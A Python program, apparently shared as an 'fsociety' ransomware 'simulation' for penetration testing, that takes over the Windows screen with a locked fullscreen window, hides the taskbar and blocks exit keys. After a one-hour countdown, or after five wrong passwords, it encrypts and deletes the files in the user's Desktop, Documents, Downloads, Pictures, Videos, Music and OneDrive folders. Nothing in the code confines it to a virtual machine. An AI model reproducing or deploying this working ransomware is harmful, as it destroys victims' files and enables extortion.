#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSOCIETY RANSOMWARE SIMULATION
Authorized Penetration Testing Tool - FOR VM USE ONLY
"""

import ctypes
import ctypes.wintypes
import os
import sys
import random
import threading
import tkinter as tk
from tkinter import messagebox
from io import BytesIO
from urllib.request import urlopen
from PIL import Image, ImageTk

# ================ Cryptography ================
from cryptography.fernet import Fernet

# ================ Windows API Constants ================
SW_HIDE = 0
SW_SHOW = 5
HWND_TOPMOST = ctypes.c_int(-1)
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001

# ================ Config ================
PASSWORD = "fsociety298.dat"
COUNTDOWN_SECONDS = 60 * 60   # ساعة كاملة
MAX_ATTEMPTS = 5              # عدد المحاولات الخاطئة
ENCRYPTED_EXT = ".fsociety"

# مسارات المستخدم اللي هتتشفر
USER_PROFILE = os.environ.get("USERPROFILE", "C:\\Users\\User")
TARGET_FOLDERS = [
    os.path.join(USER_PROFILE, "Desktop"),
    os.path.join(USER_PROFILE, "Documents"),
    os.path.join(USER_PROFILE, "Downloads"),
    os.path.join(USER_PROFILE, "Pictures"),
    os.path.join(USER_PROFILE, "Videos"),
    os.path.join(USER_PROFILE, "Music"),
    os.path.join(USER_PROFILE, "OneDrive"),
]

# امتدادات يتم تجاهلها
SKIP_EXT = {
    ".exe", ".dll", ".sys", ".msi", ".lnk",
    ".fsociety",
}

# ================ ctypes ================
user32 = ctypes.windll.user32
user32.ShowWindow.argtypes = (ctypes.wintypes.HWND, ctypes.c_int)
user32.FindWindowW.restype = ctypes.wintypes.HWND
user32.FindWindowW.argtypes = (ctypes.wintypes.LPCWSTR, ctypes.wintypes.LPCWSTR)

# ================ Assets ================
LOCAL_LOGO_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "fsociety_logo.png"
)
FSOCIETY_LOGO_URL = "https://i.imgur.com/TFDmnSS.png"


# ================ Helpers ================
def hide_taskbar():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, SW_HIDE)
    hwnd2 = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
    if hwnd2:
        user32.ShowWindow(hwnd2, SW_HIDE)


def show_taskbar():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, SW_SHOW)
    hwnd2 = user32.FindWindowW("Shell_SecondaryTrayWnd", None)
    if hwnd2:
        user32.ShowWindow(hwnd2, SW_SHOW)


def load_logo(url):
    """Load logo from local file first, fallback to URL."""
    if os.path.exists(LOCAL_LOGO_PATH):
        try:
            return Image.open(LOCAL_LOGO_PATH).convert("RGBA")
        except Exception:
            pass
    try:
        resp = urlopen(url, timeout=10)
        data = resp.read()
        img = Image.open(BytesIO(data)).convert("RGBA")
        try:
            img.save(LOCAL_LOGO_PATH)
        except Exception:
            pass
        return img
    except Exception:
        return None


def format_time(seconds):
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"


# ================ Encryption Engine ================
class RansomEngine:
    """محرك التشفير — Fernet (AES-128-CBC + HMAC-SHA256)"""

    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.locked = threading.Lock()
        self.encrypted_count = 0
        self.stopped = False

    def save_key(self):
        """حفظ المفتاح على الـ Desktop"""
        try:
            key_path = os.path.join(USER_PROFILE, "Desktop", "fsociety_key.txt")
            with open(key_path, "wb") as f:
                f.write(self.key)
            return key_path
        except Exception as e:
            print(f"[KEY SAVE ERROR] {e}")
            return None

    def encrypt_file(self, path):
        """تشفير ملف واحد"""
        try:
            if not os.path.isfile(path):
                return False

            ext = os.path.splitext(path)[1].lower()
            if ext in SKIP_EXT or path.endswith(ENCRYPTED_EXT):
                return False

            size = os.path.getsize(path)
            if size == 0 or size > 50 * 1024 * 1024:
                return False

            with open(path, "rb") as f:
                data = f.read()

            encrypted = self.cipher.encrypt(data)

            new_path = path + ENCRYPTED_EXT
            with open(new_path, "wb") as f:
                f.write(encrypted)

            os.remove(path)

            with self.locked:
                self.encrypted_count += 1
            return True
        except Exception:
            return False

    def decrypt_file(self, path):
        """فك تشفير ملف واحد"""
        try:
            if not path.endswith(ENCRYPTED_EXT):
                return False

            with open(path, "rb") as f:
                data = f.read()

            decrypted = self.cipher.decrypt(data)

            original = path[:-len(ENCRYPTED_EXT)]
            with open(original, "wb") as f:
                f.write(decrypted)

            os.remove(path)
            return True
        except Exception:
            return False

    def walk_and_encrypt(self, folders):
        """المشي على الفولدرات وتشفير كل الملفات"""
        for folder in folders:
            if self.stopped:
                return
            if not os.path.isdir(folder):
                continue

            for root, dirs, files in os.walk(folder):
                if self.stopped:
                    return

                dirs[:] = [d for d in dirs if d not in (
                    "AppData", "Program Files", "Program Files (x86)",
                    "Windows", "$Recycle.Bin", "System Volume Information"
                )]

                for name in files:
                    if self.stopped:
                        return
                    self.encrypt_file(os.path.join(root, name))

    def decrypt_all(self, folders):
        """فك تشفير كل الملفات"""
        for folder in folders:
            if not os.path.isdir(folder):
                continue
            for root, dirs, files in os.walk(folder):
                for name in files:
                    if name.endswith(ENCRYPTED_EXT):
                        self.decrypt_file(os.path.join(root, name))


# ================ Main App ================
class FsocietyRansomware:
    def __init__(self):
        self.root = tk.Tk()
        self.is_shaking = False
        self.shake_count = 0
        self.remaining_seconds = COUNTDOWN_SECONDS
        self.countdown_running = True
        self.countdown_job = None

        # ✅ عدّاد المحاولات الخاطئة
        self.wrong_attempts = 0

        # محرك التشفير
        self.ransom = RansomEngine()
        self.ransom.save_key()
        self.encryption_thread = None
        self.encryption_started = False

        # Window setup
        self.root.overrideredirect(True)
        self.root.state('zoomed')
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#000000')
        self.root.title("fsociety")

        # Block keys
        self.root.bind('<Alt-F4>', self._block_event)
        self.root.bind('<Escape>', self._block_event)
        self.root.bind('<Alt_L>', self._block_event)
        self.root.bind('<Alt_R>', self._block_event)
        self.root.bind('<KeyRelease-Alt_L>', self._block_event)
        self.root.bind('<KeyRelease-Alt_R>', self._block_event)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        self._keep_topmost()
        self.logo_img = load_logo(FSOCIETY_LOGO_URL)
        self._build_ui()
        self._start_countdown()
        self.root.after(100, self._force_focus)
        self.root.bind('<Destroy>', self._on_destroy)

    def _block_event(self, event):
        return "break"

    def _keep_topmost(self):
        def keep():
            if not self.root.winfo_exists():
                return
            hwnd = ctypes.wintypes.HWND(self.root.winfo_id())
            user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                                SWP_NOMOVE | SWP_NOSIZE)
            self.root.after(500, keep)
        keep()

    def _force_focus(self):
        self.root.focus_force()
        self.root.lift()
        self.root.attributes('-topmost', True)

        def refocus():
            if not self.root.winfo_exists():
                return
            self.root.lift()
            self.root.focus_force()
            self.root.after(2000, refocus)
        self.root.after(2000, refocus)

    def _on_destroy(self, event):
        show_taskbar()

    def _build_ui(self):
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()

        self.canvas = tk.Canvas(self.root, width=sw, height=sh,
                                bg='#000000', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)

        cx = sw // 2
        cy = int(sh * 0.30)

        # ===== Logo =====
        logo_size = 420
        if self.logo_img:
            lw, lh = self.logo_img.size
            ratio = logo_size / max(lw, lh)
            new_size = (int(lw * ratio), int(lh * ratio))
            logo_resized = self.logo_img.resize(new_size, Image.LANCZOS)
            self.logo_photo = ImageTk.PhotoImage(logo_resized)
            self.canvas.create_image(cx, cy, image=self.logo_photo)

        # ===== Title =====
        self.canvas.create_text(
            cx, cy + 180,
            text="WE ARE FSOCIETY",
            fill='#ffffff',
            font=('Consolas', 24, 'bold'),
            anchor='center'
        )

        self.canvas.create_text(
            cx, cy + 210, 
            text="developed by: xPh4nt0m-Byte",
            fill='#ffffff',
            font=('Consolas', 12, 'bold'),
            anchor='center'
        )
        # ===== Countdown =====
        countdown_y = cy + 240
        self.countdown_id = self.canvas.create_text(
            cx, countdown_y,
            text=f"REMAINING:  {format_time(self.remaining_seconds)}",
            fill='#ff3232',
            font=('Consolas', 22, 'bold'),
            anchor='center'
        )

        # ===== Warning line =====
        self.warn_id = self.canvas.create_text(
            cx, countdown_y + 40,
            text="ALL YOUR FILES WILL BE ENCRYPTED WHEN TIME RUNS OUT",
            fill='#888888',
            font=('Consolas', 11, 'bold'),
            anchor='center'
        )

        # ===== Entry =====
        entry_w, entry_h = 340, 38
        entry_y = countdown_y + 100

        self.canvas.create_rectangle(
            cx - entry_w // 2 - 2,
            entry_y - entry_h // 2 - 2,
            cx + entry_w // 2 + 2,
            entry_y + entry_h // 2 + 2,
            fill='#ffffff', outline=''
        )

        self.pass_entry = tk.Entry(
            self.root,
            font=('Consolas', 16, 'bold'),
            fg='#000000', bg='#ffffff',
            insertbackground='#000000',
            bd=0, relief='flat',
            justify='center',
            show='•',
            highlightthickness=0
        )
        self.pass_entry.place(
            x=cx - entry_w // 2,
            y=entry_y - entry_h // 2,
            width=entry_w, height=entry_h
        )
        self.pass_entry.bind('<Return>', lambda e: self._check_password())
        self.pass_entry.focus_set()

        # ===== Button =====
        btn_w, btn_h = 160, 34
        btn_y = entry_y + 55

        self.submit_btn = tk.Button(
            self.root,
            text="SUBMIT KEY",
            font=('Consolas', 12, 'bold'),
            fg='#ffffff', bg='#e8590c',
            activeforeground='#ffffff', activebackground='#ff6b1a',
            bd=0, relief='flat', cursor='hand2',
            command=self._check_password
        )
        self.submit_btn.place(
            x=cx - btn_w // 2,
            y=btn_y - btn_h // 2,
            width=btn_w, height=btn_h
        )
        self.submit_btn.bind('<Enter>', lambda e: self.submit_btn.configure(bg='#ff6b1a'))
        self.submit_btn.bind('<Leave>', lambda e: self.submit_btn.configure(bg='#e8590c'))

        # ===== Attempts counter =====
        self.attempts_label = tk.Label(
            self.root,
            text=f"ATTEMPTS: 0 / {MAX_ATTEMPTS}",
            fg='#888888', bg='#000000',
            font=('Consolas', 10, 'bold')
        )
        self.attempts_label.place(
            x=cx - 400, y=btn_y + 25,
            width=800, height=22
        )

        # ===== Status label =====
        self.status_label = tk.Label(
            self.root,
            text="",
            fg='#ff3232', bg='#000000',
            font=('Consolas', 12, 'bold')
        )
        self.status_label.place(
            x=cx - 400, y=btn_y + 50,
            width=800, height=30
        )

        # ===== Progress label =====
        self.progress_label = tk.Label(
            self.root,
            text="",
            fg='#ff8800', bg='#000000',
            font=('Consolas', 11, 'bold')
        )
        self.progress_label.place(
            x=cx - 400, y=btn_y + 80,
            width=800, height=25
        )

    # ============ Countdown ============
    def _start_countdown(self):
        def tick():
            if not self.countdown_running:
                return
            if not self.root.winfo_exists():
                return

            if self.remaining_seconds <= 0:
                self.canvas.itemconfigure(
                    self.countdown_id,
                    text="TIME'S UP",
                    fill='#ff0000'
                )
                self.canvas.itemconfigure(
                    self.warn_id,
                    text="ENCRYPTING YOUR FILES...",
                    fill='#ff0000'
                )
                self.countdown_running = False
                self._start_encryption()
                return

            self.canvas.itemconfigure(
                self.countdown_id,
                text=f"REMAINING:  {format_time(self.remaining_seconds)}"
            )
            self.remaining_seconds -= 1
            self.countdown_job = self.root.after(1000, tick)

        tick()

    # ============ Encryption ============
    def _start_encryption(self):
        """يبدأ التشفير في thread منفصل"""
        if self.encryption_started:
            return
        self.encryption_started = True

        # عطّل الإدخال
        try:
            self.pass_entry.configure(state='disabled')
            self.submit_btn.configure(state='disabled')
        except tk.TclError:
            pass

        def update_progress():
            if self.ransom.stopped:
                return
            if not self.root.winfo_exists():
                return
            try:
                self.progress_label.configure(
                    text=f"ENCRYPTED FILES: {self.ransom.encrypted_count}"
                )
                self.root.after(500, update_progress)
            except tk.TclError:
                pass

        def worker():
            self.ransom.walk_and_encrypt(TARGET_FOLDERS)
            if not self.ransom.stopped and self.root.winfo_exists():
                self.root.after(0, self._show_ransom_note)

        update_progress()
        self.encryption_thread = threading.Thread(target=worker, daemon=True)
        self.encryption_thread.start()

    def _show_ransom_note(self):
        """رسالة الفدية النهائية"""
        try:
            self.canvas.itemconfigure(
                self.countdown_id,
                text="ALL YOUR FILES HAVE BEEN ENCRYPTED",
                fill='#ff0000'
            )
            self.canvas.itemconfigure(
                self.warn_id,
                text=f"Total: {self.ransom.encrypted_count} files encrypted  |  Extension: {ENCRYPTED_EXT}",
                fill='#ff8800'
            )
            self.status_label.configure(
                text=">> YOUR FILES ARE NOW HOSTAGE <<",
                fg='#ff0000'
            )
        except tk.TclError:
            pass

    # ============ Password check ============
    def _check_password(self):
        entered = self.pass_entry.get().strip()

        # ===== باسورد صح =====
        if entered == PASSWORD:
            self.countdown_running = False
            if self.countdown_job:
                self.root.after_cancel(self.countdown_job)

            self.ransom.stopped = True

            self.status_label.configure(
                text=">> ACCESS GRANTED — DECRYPTING FILES... <<",
                fg='#00ff00'
            )
            self.canvas.itemconfigure(
                self.countdown_id,
                text="UNLOCKED",
                fill='#00ff00'
            )
            self.canvas.itemconfigure(
                self.warn_id,
                text="Decrypting... please wait.",
                fill='#00ff00'
            )
            self.pass_entry.configure(state='disabled')
            self.submit_btn.configure(state='disabled')

            def decrypt_worker():
                self.ransom.decrypt_all(TARGET_FOLDERS)
                self.root.after(0, self._on_decrypt_done)

            threading.Thread(target=decrypt_worker, daemon=True).start()

        # ===== باسورد غلط =====
        else:
            self.wrong_attempts += 1
            remaining = MAX_ATTEMPTS - self.wrong_attempts

            # حدّث عدّاد المحاولات
            self.attempts_label.configure(
                text=f"ATTEMPTS: {self.wrong_attempts} / {MAX_ATTEMPTS}",
                fg='#ff3232' if self.wrong_attempts >= 3 else '#ff8800'
            )

            if self.wrong_attempts < MAX_ATTEMPTS:
                self.status_label.configure(
                    text=f">> ACCESS DENIED — {remaining} ATTEMPTS LEFT <<",
                    fg='#ff3232'
                )
                self.pass_entry.delete(0, 'end')
                self._shake_window()
            else:
                self._trigger_bye_bye()

    def _trigger_bye_bye(self):
        """5 محاولات خاطئة → BYE BYE + تشفير فوري"""
        # وقف العدّاد
        self.countdown_running = False
        if self.countdown_job:
            self.root.after_cancel(self.countdown_job)

        # وقف الإدخال
        self.pass_entry.configure(state='disabled')
        self.submit_btn.configure(state='disabled')

        # تحديث الشاشة
        self.canvas.itemconfigure(
            self.countdown_id,
            text="BYE BYE !",
            fill='#ff0000'
        )
        self.canvas.itemconfigure(
            self.warn_id,
            text="TOO MANY FAILED ATTEMPTS",
            fill='#ff3232'
        )
        self.status_label.configure(
            text=">> BYE BYE ! <<",
            fg='#ff0000'
        )
        self.attempts_label.configure(
            text=f"ATTEMPTS: {MAX_ATTEMPTS} / {MAX_ATTEMPTS}",
            fg='#ff0000'
        )

        # اهتزاز
        self._shake_window()

        # رسالة منبثقة
        try:
            messagebox.showerror(
                "FSOCIETY",
                "BYE BYE !\n\nToo many failed attempts.\nYour files are now encrypted."
            )
        except tk.TclError:
            pass

        # ✅ ابدأ التشفير فوراً
        self.root.after(500, self._start_encryption)

    def _on_decrypt_done(self):
        try:
            self.progress_label.configure(
                text="All files decrypted successfully.",
                fg='#00ff00'
            )
            messagebox.showinfo(
                "FSOCIETY // ACCESS GRANTED",
                "SYSTEM UNLOCKED\n\nAll files have been decrypted.\n\n\"WE ARE FSOCIETY\""
            )
            show_taskbar()
            self.root.destroy()
            sys.exit(0)
        except tk.TclError:
            pass

    def _shake_window(self):
        if self.is_shaking:
            return
        self.is_shaking = True
        self.shake_count = 0
        orig_x = self.root.winfo_x()
        orig_y = self.root.winfo_y()

        def shake():
            self.shake_count += 1
            try:
                if not self.root.winfo_exists():
                    return
                if self.shake_count > 20:
                    self.root.geometry(f"+{orig_x}+{orig_y}")
                    self.is_shaking = False
                    return
                offset = (self.shake_count % 2) * 2 - 1
                offset *= 14 - self.shake_count
                self.root.geometry(f"+{orig_x + offset}+{orig_y}")
                self.root.after(25, shake)
            except tk.TclError:
                pass
        shake()

    def run(self):
        hide_taskbar()
        self.root.mainloop()


# ================ Entry Point ================
if __name__ == "__main__":
    app = FsocietyRansomware()
    app.run()
